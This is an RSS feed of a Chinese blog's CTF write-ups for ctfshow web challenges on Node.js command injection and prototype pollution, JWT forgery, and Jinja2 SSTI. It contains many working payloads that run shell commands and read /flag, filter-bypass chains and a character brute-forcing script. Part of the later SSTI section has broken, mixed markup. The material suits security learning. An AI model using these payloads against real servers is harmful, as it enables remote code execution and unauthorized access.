<?xml version="1.0"?>
<rss version="2.0">
    <channel>
        <title>dpm12345 • Posts by &#34;web入门&#34; category</title>
        <link>http://dpm12345.cn</link>
        <description>学习记录</description>
        <language>zh-CN</language>
        <pubDate>Thu, 10 Aug 2023 22:15:40 +0800</pubDate>
        <lastBuildDate>Thu, 10 Aug 2023 22:15:40 +0800</lastBuildDate>
        <category>Qt</category>
        <category>ms17</category>
        <category>msf</category>
        <category>git</category>
        <category>CTF</category>
        <category>sql注入</category>
        <category>笔记</category>
        <category>SSRF</category>
        <category>kali</category>
        <category>nmap</category>
        <category>Misc</category>
        <category>MFC</category>
        <category>cryptography</category>
        <category>ctfshow</category>
        <category>Web</category>
        <category>树</category>
        <category>二叉树</category>
        <category>数据结构</category>
        <category>hexo</category>
        <category>队列</category>
        <category>前缀和</category>
        <category>动态规划</category>
        <category>滑动窗口</category>
        <category>数组</category>
        <category>哈希表</category>
        <category>链表</category>
        <category>矩阵</category>
        <category>递归</category>
        <category>贪心</category>
        <category>子序列</category>
        <category>最长公共子序列</category>
        <category>最长回文子序列</category>
        <category>字符串</category>
        <category>括号</category>
        <category>vector</category>
        <category>栈</category>
        <category>双指针（快慢指针）</category>
        <category>排列组合</category>
        <category>等差数列</category>
        <category>深度优先搜索</category>
        <category>广度优先搜索</category>
        <category>ciscn</category>
        <category>SSTI</category>
        <category>arm-linux</category>
        <category>Tiny6410</category>
        <category>信息安全</category>
        <category>linux</category>
        <category>web</category>
        <category>javascript</category>
        <category>XXE</category>
        <item>
            <guid isPermalink="true">http://dpm12345.cn/posts/3418e521/</guid>
            <title>nodejs</title>
            <link>http://dpm12345.cn/posts/3418e521/</link>
            <category>CTF</category>
            <category>ctfshow</category>
            <pubDate>Thu, 10 Aug 2023 22:15:40 +0800</pubDate>
            <description><![CDATA[ &lt;h1 id=&#34;web-334&#34;&gt;&lt;a href=&#34;#web-334&#34; class=&#34;headerlink&#34; title=&#34;web 334&#34;&gt;&lt;/a&gt;web 334&lt;/h1&gt;&lt;p&gt;下载题目附件，得到两个js文件&lt;/p&gt;
&lt;p&gt;user.js&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;javascript&#34;&gt;module.exports = {
  items: [
    {username: &#39;CTFSHOW&#39;, password: &#39;123456&#39;}
  ]
};
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;login.js&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;javascript&#34;&gt;var express = require(&#39;express&#39;);
var router = express.Router();
var users = require(&#39;../modules/user&#39;).items;
 
var findUser = function(name, password){
  return users.find(function(item){
    return name!==&#39;CTFSHOW&#39; &amp;amp;&amp;amp; item.username === name.toUpperCase() &amp;amp;&amp;amp; item.password === password;
  });
};

/* GET home page. */
router.post(&#39;/&#39;, function(req, res, next) {
  res.type(&#39;html&#39;);
  var flag=&#39;flag_here&#39;;
  var sess = req.session;
  var user = findUser(req.body.username, req.body.password);
 
  if(user){
    req.session.regenerate(function(err) {
      if(err){
        return res.json({ret_code: 2, ret_msg: &#39;登录失败&#39;});        
      }
       
      req.session.loginUser = user.username;
      res.json({ret_code: 0, ret_msg: &#39;登录成功&#39;,ret_flag:flag});              
    });
  }else{
    res.json({ret_code: 1, ret_msg: &#39;账号或密码错误&#39;});
  }  
  
});

module.exports = router;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;从代码中可以看到，当登录成功时，会返回flag&lt;/p&gt;
&lt;p&gt;而判断是否登录正确的代码如下&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;javascript&#34;&gt;var findUser = function(name, password){
  return users.find(function(item){
    return name!==&#39;CTFSHOW&#39; &amp;amp;&amp;amp; item.username === name.toUpperCase() &amp;amp;&amp;amp; item.password === password;
  });
};
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;从&lt;code&gt;return&lt;/code&gt;中，可以看到，要使得输入用户名不为&lt;code&gt;CTFSHOW&lt;/code&gt;,但其全部大写等于原设置的用户名(即&lt;code&gt;CTFSHOW&lt;/code&gt;),最后密码相等&lt;/p&gt;
&lt;p&gt;由user.js,可以知道用户名和密码分别为&lt;code&gt;CTFSHOW&lt;/code&gt;和&lt;code&gt;123456&lt;/code&gt;,而为了满足条件，可以将用户名其中一个字母变为小写输入提交&lt;/p&gt;
&lt;p&gt;如下所示&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;/./../../../../post_images/ctfshow/Web-vip/web334_1.png&#34; alt=&#34;image-20230810195751429&#34;&gt;&lt;/p&gt;
&lt;h1 id=&#34;web-335&#34;&gt;&lt;a href=&#34;#web-335&#34; class=&#34;headerlink&#34; title=&#34;web 335&#34;&gt;&lt;/a&gt;web 335&lt;/h1&gt;&lt;pre&gt;&lt;code&gt;Node.js中的chile_process.exec调用的是/bash.sh，它是一个bash解释器，可以执行系统命令。
在eval函数的参数中可以构造require(&#39;child_process&#39;).exec(&#39;&#39;);来进行调用。
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;使用&lt;code&gt;exec&lt;/code&gt;返回&lt;code&gt;[object Object]&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;可替换用法 &lt;code&gt;execSync&lt;/code&gt; &lt;code&gt;spawnSync&lt;/code&gt;&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;&lt;p&gt;使用&lt;code&gt;execSync&lt;/code&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;javascript&#34;&gt;require(&#39;child_process&#39;).execSync(&#39;ls&#39;)
require(&#39;child_process&#39;).execSync(&#39;cat fl00g.txt&#39;)
&lt;/code&gt;&lt;/pre&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;使用&lt;code&gt;spawnSync&lt;/code&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;javascript&#34;&gt;require(&#39;child_process&#39;).spawnSync(&#39;ls&#39;).stdout.toString()
require(&#39;child_process&#39;).spawnSync(&#39;cat&#39;,[&#39;fl00g.txt&#39;]).stdout.toString()
&lt;/code&gt;&lt;/pre&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;h1 id=&#34;web-336&#34;&gt;&lt;a href=&#34;#web-336&#34; class=&#34;headerlink&#34; title=&#34;web 336&#34;&gt;&lt;/a&gt;web 336&lt;/h1&gt;&lt;pre&gt;&lt;code class=&#34;javascript&#34;&gt;require(&#39;child_process&#39;).spawnSync(&#39;ls&#39;).stdout.toString()
require(&#39;child_process&#39;).spawnSync(&#39;cat&#39;,[&#39;fl001g.txt&#39;]).stdout.toString()
&lt;/code&gt;&lt;/pre&gt;
&lt;h1 id=&#34;web-337&#34;&gt;&lt;a href=&#34;#web-337&#34; class=&#34;headerlink&#34; title=&#34;web 337&#34;&gt;&lt;/a&gt;web 337&lt;/h1&gt;&lt;pre&gt;&lt;code class=&#34;javascript&#34;&gt;var express = require(&#39;express&#39;);
var router = express.Router();
var crypto = require(&#39;crypto&#39;);

function md5(s) {
  return crypto.createHash(&#39;md5&#39;)
    .update(s)
    .digest(&#39;hex&#39;);
}

/* GET home page. */
router.get(&#39;/&#39;, function(req, res, next) {
  res.type(&#39;html&#39;);
  var flag=&#39;xxxxxxx&#39;;
  var a = req.query.a;
  var b = req.query.b;
  if(a &amp;amp;&amp;amp; b &amp;amp;&amp;amp; a.length===b.length &amp;amp;&amp;amp; a!==b &amp;amp;&amp;amp; md5(a+flag)===md5(b+flag)){
      res.end(flag);
  }else{
      res.render(&#39;index&#39;,{ msg: &#39;tql&#39;});
  }
  
});

module.exports = router;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;md5数组绕过&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;?a[]=1&amp;amp;b[]=1
&lt;/code&gt;&lt;/pre&gt;
&lt;h1 id=&#34;web-338&#34;&gt;&lt;a href=&#34;#web-338&#34; class=&#34;headerlink&#34; title=&#34;web 338&#34;&gt;&lt;/a&gt;web 338&lt;/h1&gt;&lt;p&gt;题目给出了源码&lt;/p&gt;
&lt;p&gt;查阅wp，知该题为nodejs原型污染&lt;/p&gt;
&lt;h2 id=&#34;原型链污染&#34;&gt;&lt;a href=&#34;#原型链污染&#34; class=&#34;headerlink&#34; title=&#34;原型链污染&#34;&gt;&lt;/a&gt;原型链污染&lt;/h2&gt;&lt;p&gt;Javascript里每个类都有一个&lt;code&gt;prototype&lt;/code&gt;的属性，用来绑定所有对象都会有变量与函数，对象的构造函数又指向类本身，同时对象的&lt;code&gt;__proto__&lt;/code&gt;属性也指向类的&lt;code&gt;prototype&lt;/code&gt;。因此，有以下关系：&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;/./../../../../post_images/ctfshow/Web-vip/web334_2.png&#34; alt=&#34;web334_2&#34;&gt;&lt;/p&gt;
&lt;p&gt;并且，类的继承是通过原型链传递的，一个类的&lt;code&gt;prototype&lt;/code&gt;属性指向其继承的类的一个对象。所以一个类的&lt;code&gt;prototype.__proto__&lt;/code&gt;等于其父类的&lt;code&gt;prototype&lt;/code&gt;，当然也等于该类对象的&lt;code&gt;__proto__.__proto__&lt;/code&gt;属性。&lt;/p&gt;
&lt;p&gt;我们获取某个对象的某个成员时，如果找不到，就会通过原型链一步步往上找，直到某个父类的原型为&lt;code&gt;null&lt;/code&gt;为止。所以修改对象的某个父类的&lt;code&gt;prototype&lt;/code&gt;的原型就可以通过原型链影响到跟此类有关的所有对象。&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;/./../../../../post_images/ctfshow/Web-vip/web334_3.png&#34; alt=&#34;web334_3&#34;&gt;&lt;/p&gt;
&lt;p&gt;而在源码中可以发现&lt;/p&gt;
&lt;p&gt;login.js&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;javascript&#34;&gt;/* GET home page.  */
router.post(&#39;/&#39;, require(&#39;body-parser&#39;).json(),function(req, res, next) {
  res.type(&#39;html&#39;);
  var flag=&#39;flag_here&#39;;
  var secert = {};
  var sess = req.session;
  let user = {};
  utils.copy(user,req.body);
  if(secert.ctfshow===&#39;36dboy&#39;){
    res.end(flag);
  }else{
    return res.json({ret_code: 2, ret_msg: &#39;登录失败&#39;+JSON.stringify(user)});  
  }
  
  
});
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;copy在common.js中&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;javascript&#34;&gt;module.exports = {
  copy:copy
};

function copy(object1, object2){
    for (let key in object2) {
        if (key in object2 &amp;amp;&amp;amp; key in object1) {
            copy(object1[key], object2[key])
        } else {
            object1[key] = object2[key]
        }
    }
  }
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;由此，在上传登录的用户名密码信息时，copy对其属性即值进行了复制，那么就可以通过抓包在&lt;code&gt;__proto__&lt;/code&gt;增添&lt;code&gt;ctfshow&lt;/code&gt;这一项的值，为&lt;code&gt;36dboy&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;抓包并修改提交的数据data如下(即添加&lt;code&gt;__proto_&lt;/code&gt;项)&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;/./../../../../post_images/ctfshow/Web-vip/web_338_1.png&#34; alt=&#34;image-20230815011437707&#34;&gt;&lt;/p&gt;
 ]]></description>
        </item>
        <item>
            <guid isPermalink="true">http://dpm12345.cn/posts/8d17cdf0/</guid>
            <title>jwt</title>
            <link>http://dpm12345.cn/posts/8d17cdf0/</link>
            <category>CTF</category>
            <category>ctfshow</category>
            <pubDate>Thu, 01 Jun 2023 01:12:40 +0800</pubDate>
            <description><![CDATA[ &lt;h1 id=&#34;JWT-简介&#34;&gt;&lt;a href=&#34;#JWT-简介&#34; class=&#34;headerlink&#34; title=&#34;JWT 简介&#34;&gt;&lt;/a&gt;JWT 简介&lt;/h1&gt;&lt;h1 id=&#34;web-345&#34;&gt;&lt;a href=&#34;#web-345&#34; class=&#34;headerlink&#34; title=&#34;web 345&#34;&gt;&lt;/a&gt;web 345&lt;/h1&gt;&lt;p&gt;在cookie里找到auth，然后将其放到jwt.io解码，可以得到一堆信息，可以发现签名算法为None，因此不需签名认证&lt;/p&gt;
&lt;p&gt;根据原题目源代码的提示admin，试着将&lt;code&gt;sub:&#39;user&#39;&lt;/code&gt;改为admin用户，将新生成的cookie复制到cookie里，然后访问&lt;code&gt;/admin&lt;/code&gt;得到flag&lt;/p&gt;
&lt;h1 id=&#34;web-346&#34;&gt;&lt;a href=&#34;#web-346&#34; class=&#34;headerlink&#34; title=&#34;web 346&#34;&gt;&lt;/a&gt;web 346&lt;/h1&gt;&lt;p&gt;相比于签名的，有签名算法了，但可以按上面一题一样，将算法改为None，然后山区签名结果，这样可以访问到flag&lt;/p&gt;
&lt;h1 id=&#34;web-347&#34;&gt;&lt;a href=&#34;#web-347&#34; class=&#34;headerlink&#34; title=&#34;web 347&#34;&gt;&lt;/a&gt;web 347&lt;/h1&gt;&lt;p&gt;根据题目的弱口令，可以爆破或者弱口令尝试分别使用&lt;/p&gt;
&lt;p&gt;计算爆破&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9naXRodWIuY29tL2JyZW5kYW4tcml1cy9jLWp3dC1jcmFja2Vy&#34;&gt;c-jwt-cracker&lt;/span&gt;&lt;del&gt;自己试跑了好久也没成&lt;/del&gt;&lt;/p&gt;
&lt;p&gt;字典爆破&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9naXRodWIuY29tL2hhaHd1bC9qd3QtaGFjaw==&#34;&gt;jwt-hack&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;跑出来密码是&lt;code&gt;123456&lt;/code&gt;，然后到&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9qd3QuaW8v&#34;&gt;jwt.io&lt;/span&gt;encode生成cookie即可&lt;/p&gt;
&lt;p&gt;然后复制修改cookie值，访问&lt;code&gt;/admin/&lt;/code&gt;&lt;/p&gt;
&lt;h1 id=&#34;web-348&#34;&gt;&lt;a href=&#34;#web-348&#34; class=&#34;headerlink&#34; title=&#34;web 348&#34;&gt;&lt;/a&gt;web 348&lt;/h1&gt;&lt;p&gt;同上一题，得到密码为&lt;code&gt;aaab&lt;/code&gt;&lt;/p&gt;
&lt;h1 id=&#34;web-349&#34;&gt;&lt;a href=&#34;#web-349&#34; class=&#34;headerlink&#34; title=&#34;web 349&#34;&gt;&lt;/a&gt;web 349&lt;/h1&gt;&lt;p&gt;根据给的&lt;code&gt;app.js&lt;/code&gt;，分别访问&lt;code&gt;/public.key&lt;/code&gt;和&lt;code&gt;/private.key&lt;/code&gt;获得公私钥文件&lt;/p&gt;
&lt;p&gt;然后放到jwt.io网站上生成cookie(原题目给的私钥大小不是2048位的，不能生成)&lt;/p&gt;
&lt;p&gt;这里采用的是&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly93d3cuYmlsaWJpbGkuY29tL3ZpZGVvL0JWMXZVNHkxODdIRS8=&#34;&gt;ctfshow jwt视频&lt;/span&gt;的自建环境生成cookie&lt;/p&gt;
&lt;p&gt;要注意的是，新版本的jsonwebtoken(9.0.0)可能会报错&lt;/p&gt;
&lt;p&gt;&lt;code&gt;secretOrPrivateKey has a minimum key size of 2048 bits for RS256&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;查询相关资料后，可以下载8.5.1版本的jsonwebtoken，&lt;code&gt;npm install jsonwebtoken@8.5.1 --save&lt;/code&gt;,然后生成后复制cookie替换，最后post访问网站&lt;/p&gt;
&lt;h1 id=&#34;web-350&#34;&gt;&lt;a href=&#34;#web-350&#34; class=&#34;headerlink&#34; title=&#34;web 350&#34;&gt;&lt;/a&gt;web 350&lt;/h1&gt;&lt;p&gt;相比于上题，只能获得公钥，但可以通过&lt;code&gt;RS256 -&amp;gt; HS256&lt;/code&gt;是验证算法改变&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;HS256算法使用密钥为所有消息进行签名和验证。

而RS256算法则使用私钥对消息进行签名并使用公钥进行身份验证。

如果将算法从RS256改为HS256，则后端代码将使用公钥作为密钥，然后使用HS256算法验证签名。

由于攻击者有时可以获取公钥，因此，攻击者可以将头部中的算法修改为HS256，然后使用RSA公钥对数据进行签名。

这样的话，后端代码使用RSA公钥+HS256算法进行签名验证
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;按照上题的构造方法生成cookie即可&lt;/p&gt;
 ]]></description>
        </item>
        <item>
            <guid isPermalink="true">http://dpm12345.cn/posts/47d18edd/</guid>
            <title>SSTI</title>
            <link>http://dpm12345.cn/posts/47d18edd/</link>
            <category>CTF</category>
            <category>ctfshow</category>
            <pubDate>Fri, 31 Mar 2023 11:12:40 +0800</pubDate>
            <description><![CDATA[ &lt;h1 id=&#34;web-361&#34;&gt;&lt;a href=&#34;#web-361&#34; class=&#34;headerlink&#34; title=&#34;web 361&#34;&gt;&lt;/a&gt;web 361&lt;/h1&gt;&lt;p&gt;提示考点在名字&lt;/p&gt;
&lt;p&gt;尝试&lt;code&gt;?name={{4+4}}&lt;/code&gt;，返回出错，确认为注入点&lt;/p&gt;
&lt;p&gt;于是&lt;code&gt;?name={{&#39;&#39;.__class__.__mro__[1].__subclasses__()}}&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;找到&lt;/p&gt;
&lt;p&gt;&lt;code&gt;&amp;lt;class &#39;os._wrap_close&#39;&amp;gt;&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;然后&lt;/p&gt;
&lt;p&gt;&lt;code&gt;?name={{&#39;&#39;.__class__.__mro__[1].__subclasses__()[132].__init__.__globals__[&#39;popen&#39;](&#39;ls&#39;).read()}}&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;得到 app.py&lt;/p&gt;
&lt;p&gt;&lt;code&gt;?name={{&#39;&#39;.__class__.__mro__[1].__subclasses__()[132].__init__.__globals__[&#39;popen&#39;](&#39;ls /&#39;).read()}}&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;得到 app bin boot dev etc flag home lib lib64 media mnt opt proc root run sbin srv start.sh sys tmp usr var&lt;/p&gt;
&lt;p&gt;&lt;code&gt;?name={{&#39;&#39;.__class__.__mro__[1].__subclasses__()[132].__init__.__globals__[&#39;popen&#39;](&#39;cat /flag&#39;).read()}}&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;得到flag&lt;/p&gt;
&lt;p&gt;或者&lt;code&gt;?name={{&#39;&#39;.__class__.__mro__[1].__subclasses__()[132].__init__.__globals__[&#39;popen&#39;](&#39;ls&#39;).read()}}&lt;/code&gt;&lt;/p&gt;
&lt;h1 id=&#34;web-362&#34;&gt;&lt;a href=&#34;#web-362&#34; class=&#34;headerlink&#34; title=&#34;web 362&#34;&gt;&lt;/a&gt;web 362&lt;/h1&gt;&lt;p&gt;进行了过滤，但不清楚过滤啥&lt;/p&gt;
&lt;p&gt;只能发现上面os的不能选择，于是选择407的&lt;code&gt;&amp;lt;class &#39;subprocess.Popen&#39;&amp;gt;&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;code&gt;?name={{&#39;&#39;.__class__.__mro__[1].__subclasses__()[407].__init__.__globals__[&#39;popen&#39;](&#39;ls&#39;).read()}}&lt;/code&gt;则不行&lt;/p&gt;
&lt;p&gt;payload:&lt;code&gt;?name={{&#39;&#39;.__class__.__mro__[1].__subclasses__()[407].__init__.__globals__[&#39;__builtins__&#39;].eval(&#39;__import__(&#34;os&#34;).popen(&#34;cat /flag&#34;).read()&#39;)}}&lt;/code&gt;&lt;/p&gt;
&lt;h1 id=&#34;web-363&#34;&gt;&lt;a href=&#34;#web-363&#34; class=&#34;headerlink&#34; title=&#34;web 363&#34;&gt;&lt;/a&gt;web 363&lt;/h1&gt;&lt;p&gt;&lt;code&gt;?name={{()[request.args.a].__bases__[0].__subclasses__()[132].__init__.__globals__[request.args.b].eval(request.args.c)}}&amp;amp;a=__class__&amp;amp;b=__builtins__&amp;amp;c=__import__(&#34;os&#34;).popen(&#34;cat /flag&#34;).read()&lt;/code&gt;&lt;/p&gt;
&lt;h1 id=&#34;web-364&#34;&gt;&lt;a href=&#34;#web-364&#34; class=&#34;headerlink&#34; title=&#34;web 364&#34;&gt;&lt;/a&gt;web 364&lt;/h1&gt;&lt;p&gt;cookies绕过&lt;/p&gt;
&lt;p&gt;&lt;code&gt;?name={{x.__class__.__mro__[1].__subclasses__()[132].__init__.__globals__[request.cookies.b].eval(request.cookies.c)}}&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;code&gt;b=__builtins__&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;code&gt;c=__import__(&#34;os&#34;).popen(&#34;cat /flag&#34;).read()&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;或者&lt;code&gt;?name={{x.__init__.__globals__.__getitem__(request.cookies.b).eval(request.cookies.c)}}&lt;/code&gt;&lt;/p&gt;
&lt;h1 id=&#34;web-365&#34;&gt;&lt;a href=&#34;#web-365&#34; class=&#34;headerlink&#34; title=&#34;web 365&#34;&gt;&lt;/a&gt;web 365&lt;/h1&gt;&lt;p&gt;同上一题&lt;/p&gt;
&lt;h1 id=&#34;web-366&#34;&gt;&lt;a href=&#34;#web-366&#34; class=&#34;headerlink&#34; title=&#34;web 366&#34;&gt;&lt;/a&gt;web 366&lt;/h1&gt;&lt;p&gt;上面的几乎都过滤了，下划线也过滤了，而attr用于获取变量&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;raw&#34;&gt;&#34;&#34;|attr(&#34;__class__&#34;)
相当于
&#34;&#34;.__class__
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;故&lt;code&gt;?name={{(x|attr(request.cookies.a)|attr(request.cookies.b)|attr(request.cookies.c))(request.cookies.d).eval(request.cookies.e)}}&lt;/code&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;raw&#34;&gt;a=__init__
b=__globals__
c=__getitem__
d=__builtins__
e=__import__(&#39;os&#39;).popen(&#39;cat /flag&#39;).read()
&lt;/code&gt;&lt;/pre&gt;
&lt;h1 id=&#34;web-367&#34;&gt;&lt;a href=&#34;#web-367&#34; class=&#34;headerlink&#34; title=&#34;web 367&#34;&gt;&lt;/a&gt;web 367&lt;/h1&gt;&lt;p&gt;同web 366&lt;/p&gt;
&lt;h1 id=&#34;web-368&#34;&gt;&lt;a href=&#34;#web-368&#34; class=&#34;headerlink&#34; title=&#34;web 368&#34;&gt;&lt;/a&gt;web 368&lt;/h1&gt;&lt;p&gt;&lt;code&gt;{{`被过滤,使用`{%%}`绕过,再借助`print()`回显

故`?name={%print((x|attr(request.cookies.a)|attr(request.cookies.b)|attr(request.cookies.c))(request.cookies.d).eval(request.cookies.e))%}`

```raw
a=__init__
b=__globals__
c=__getitem__
d=__builtins__
e=__import__(&#39;os&#39;).popen(&#39;cat /flag&#39;).read()
```

# web 369

过滤了request，这就需要自己来凑字符串

## 解法一

这里拿config来凑。一般我们想到的是使用`__str__()`，但是一个问题是`_`被ban了，所以`__str__()`用不了；这里拿string过滤器来得到config的字符串：`config|string`，但是获得字符串后本来应该用中括号或者`__getitem__()`，但是问题是`_`和`[` `]`被ban了，所以获取字符串中的某个字符比较困难。这里转换成列表，再用列表的pop方法就可以成功得到某个字符了，在跑字符的时候发现没有小写的b，只有大写的B，所以再去一层`lower()`方法，方便跑更多字符

这里用的是`{{lipsum.__globals__[&#39;os&#39;].popen(&#39;cat /flag&#39;).read()}}&lt;/code&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;python&#34;&gt;&#39;&#39;&#39;
Author       : dpm12345 1006975692@qq.com
Github       : https://github.com/dpm12345
Date         : 2023-04-09 09:39:23
LastEditors  : dpm12345 1006975692@qq.com
LastEditTime : 2023-04-09 11:33:12
Description  : 
&#39;&#39;&#39;


import requests
url=&#34;http://26e2b843-cdf9-4c43-8946-f748dd29eb7f.challenge.ctf.show/?name={{% print (config|string|list).pop({}).lower() %}}&#34;
 
payload=[&#34;__globals__&#34;,&#34;os&#34;,&#34;cat /flag&#34;]
def get_res(payload_list):
    dic = {}
    result= []
    for payload in payload_list:
        tmp_res = &#34;&#34;
        for j in payload:
            try:
                print(&#34;(config|string|list).pop(%d).lower()  ==  %s&#34;%(dic[j],j))
                tmp_res+=&#34;(config|string|list).pop(%d).lower()~&#34;%(dic[j])
            except:
                for i in range(0,1000):
                    r=requests.get(url=url.format(i))
                    location=r.text.find(&#34;&amp;lt;h3&amp;gt;&#34;)
                    word=r.text[location+4:location+5]
                    if word==j.lower():
                        print(&#34;(config|string|list).pop(%d).lower()  ==  %s&#34;%(i,j))
                        tmp_res+=&#34;(config|string|list).pop(%d).lower()~&#34;%(i)
                        dic[j] = i
                        break
        result.append(tmp_res[:len(tmp_res)-1])
    return result

print(get_res(payload))

# &#34;?name={% print (lipsum|attr((config|string|list).pop(74).lower()~(config|string|list).pop(74).lower()~(config|string|list).pop(6).lower()~(config|string|list).pop(41).lower()~(config|string|list).pop(2).lower()~(config|string|list).pop(33).lower()~(config|string|list).pop(40).lower()~(config|string|list).pop(41).lower()~(config|string|list).pop(42).lower()~(config|string|list).pop(74).lower()~(config|string|list).pop(74).lower())).get((config|string|list).pop(2).lower()~(config|string|list).pop(42).lower()).popen((config|string|list).pop(1).lower()~(config|string|list).pop(40).lower()~(config|string|list).pop(23).lower()~(config|string|list).pop(7).lower()~(config|string|list).pop(279).lower()~(config|string|list).pop(4).lower()~(config|string|list).pop(41).lower()~(config|string|list).pop(40).lower()~(config|string|list).pop(6).lower()).read() %}&#34;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;或者也可构造前面使用过的，如&lt;code&gt;?name={{x.__init__.__globals__.__getitem__[&#34;__builtins__&#34;].eval(&#34;__import__(&#39;os&#39;).popen(&#39;cat /flag&#39;).read()&#34;)}}&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;但要注意的是，使用&lt;code&gt;|attr&lt;/code&gt;进行连接时，后面要带上参数时,需将前面一块用括号括起，如要获取到&lt;code&gt;builtins&lt;/code&gt;的内容，&lt;code&gt;(x|attr(&#39;__init__&#39;)|attr(&#39;__globals__&#39;)|attr(&#39;__getitem__&#39;))(&#39;__builtins__&#39;)&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;如果是使用前面的，这里试验了以下，也是可以的&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;raw&#34;&gt;?name={% print (((x|attr((config|string|list).pop(74).lower()~(config|string|list).pop(74).lower()~(config|string|list).pop(5).lower()~(config|string|list).pop(3).lower()~(config|string|list).pop(5).lower()~(config|string|list).pop(23).lower()~(config|string|list).pop(74).lower()~(config|string|list).pop(74).lower())|attr((config|string|list).pop(74).lower()~(config|string|list).pop(74).lower()~(config|string|list).pop(6).lower()~(config|string|list).pop(41).lower()~(config|string|list).pop(2).lower()~(config|string|list).pop(33).lower()~(config|string|list).pop(40).lower()~(config|string|list).pop(41).lower()~(config|string|list).pop(42).lower()~(config|string|list).pop(74).lower()~(config|string|list).pop(74).lower())|attr((config|string|list).pop(74).lower()~(config|string|list).pop(74).lower()~(config|string|list).pop(6).lower()~(config|string|list).pop(10).lower()~(config|string|list).pop(23).lower()~(config|string|list).pop(5).lower()~(config|string|list).pop(23).lower()~(config|string|list).pop(10).lower()~(config|string|list).pop(157).lower()~(config|string|list).pop(74).lower()~(config|string|list).pop(74).lower()))((config|string|list).pop(74).lower()~(config|string|list).pop(74).lower()~(config|string|list).pop(33).lower()~(config|string|list).pop(21).lower()~(config|string|list).pop(5).lower()~(config|string|list).pop(41).lower()~(config|string|list).pop(23).lower()~(config|string|list).pop(5).lower()~(config|string|list).pop(3).lower()~(config|string|list).pop(42).lower()~(config|string|list).pop(74).lower()~(config|string|list).pop(74).lower()).eval((config|string|list).pop(74).lower()~(config|string|list).pop(74).lower()~(config|string|list).pop(5).lower()~(config|string|list).pop(157).lower()~(config|string|list).pop(17).lower()~(config|string|list).pop(2).lower()~(config|string|list).pop(18).lower()~(config|string|list).pop(23).lower()~(config|string|list).pop(74).lower()~(config|string|list).pop(74).lower())((config|string|list).pop(2).lower()~(config|string|list).pop(42).lower())|attr((config|string|list).pop(17).lower()~(config|string|list).pop(2).lower()~(config|string|list).pop(17).lower()~(config|string|list).pop(10).lower()~(config|string|list).pop(3).lower()))((config|string|list).pop(1).lower()~(config|string|list).pop(40).lower()~(config|string|list).pop(23).lower()~(config|string|list).pop(7).lower()~(config|string|list).pop(279).lower()~(config|string|list).pop(4).lower()~(config|string|list).pop(41).lower()~(config|string|list).pop(40).lower()~(config|string|list).pop(6).lower())|attr((config|string|list).pop(18).lower()~(config|string|list).pop(10).lower()~(config|string|list).pop(40).lower()~(config|string|list).pop(20).lower()))()
```

## 解法二

```raw
GET:?name=
{% set po=dict(po=a,p=a)|join%}
{% set a=(()|select|string|list)|attr(po)(24)%}
{% set ini=(a,a,dict(init=a)|join,a,a)|join()%}
{% set glo=(a,a,dict(globals=a)|join,a,a)|join()%}
{% set geti=(a,a,dict(getitem=a)|join,a,a)|join()%}
{% set built=(a,a,dict(builtins=a)|join,a,a)|join()%}
{% set x=(q|attr(ini)|attr(glo)|attr(geti))(built)%}
{% set chr=x.chr%}
{% set file=chr(47)%2bchr(102)%2bchr(108)%2bchr(97)%2bchr(103)%}
{%print(x.open(file).read())%}
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;原理是&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;raw&#34;&gt;{% set a=dict(o=oo,s=ss)|join %}
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;这样得到的a就是把这个字典的键名拼接后的值，即os，这样的拼接不需要用到单双引号，非常方便。至于要做的，就是想办法把类似&lt;code&gt;_&lt;/code&gt;这样的字符通过一系列操作找出来就可以了&lt;/p&gt;
